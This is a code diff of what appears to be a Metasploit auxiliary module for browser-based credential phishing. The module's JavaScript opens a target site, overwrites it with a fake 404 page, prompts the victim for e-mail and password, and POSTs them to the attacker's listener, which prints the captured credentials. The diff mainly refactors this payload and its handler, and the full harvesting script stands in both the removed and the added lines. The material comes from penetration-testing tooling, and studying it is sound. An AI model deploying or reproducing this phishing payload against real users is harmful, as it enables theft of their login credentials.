@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('CUSTOM_HTML', [
         true,
         'HTML to display to the victim.',
-        'This page has moved. Please <a href="#">click here</a> redirect your browser.'
+        'This page has moved. Please <a href="#">click here</a> to redirect your browser.'
       ])
     ])
 
@@ -61,23 +61,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def evil_javascript
-    if not datastore['CUSTOM_JS'].nil? and not datastore['CUSTOM_JS'].empty?
-      js = datastore['CUSTOM_JS']
-    else
-      js = <<-EOS
-        setTimeout(function(){
-          x.document.body.innerHTML='<h1>404 Error</h1>'+
-          '<p>Oops, something went wrong.</p>';
-          a=x.prompt('E-mail','');
-          b=x.prompt('Password','');
-          var cred=JSON.stringify({'user':a,'pass':b});
-          var xmlhttp = new XMLHttpRequest;
-            xmlhttp.open('POST', window.location, true);
-            xmlhttp.send(cred);
-          }, 3000);
-      EOS
-    end
-    return js
+    return datastore['CUSTOM_JS'] unless datastore['CUSTOM_JS'].blank?
+    js = <<-EOS
+      setTimeout(function(){
+        x.document.body.innerHTML='<h1>404 Error</h1>'+
+        '<p>Oops, something went wrong.</p>';
+        a=x.prompt('E-mail','');
+        b=x.prompt('Password','');
+        var cred=JSON.stringify({'user':a,'pass':b});
+        var xmlhttp = new XMLHttpRequest;
+          xmlhttp.open('POST', window.location, true);
+          xmlhttp.send(cred);
+        }, 3000);
+    EOS
+    js
   end
 
   def setup
@@ -87,8 +84,10 @@ class MetasploitModule < Msf::Auxiliary
         <head>
         <script>
         function go(){
-          var x = window.open('#{datastore['TARGET_URL']}');
-          #{evil_javascript}
+          try {
+            var x = window.open('#{datastore['TARGET_URL']}');
+            #{evil_javascript}
+            } catch(e) { }
           }
         </script>
         </head>
@@ -120,11 +119,10 @@ class MetasploitModule < Msf::Auxiliary
     cred = JSON.parse(request.body)
     u = cred['user']
     p = cred['pass']
-    if not u.nil? and not u.empty? and not p.nil? and not p.empty?
-      print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
-      store_cred(u,p)
-    else
+    if u.blank? || p.blank?
       print_good("#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}")
+    else
+      print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
     end
   end
 
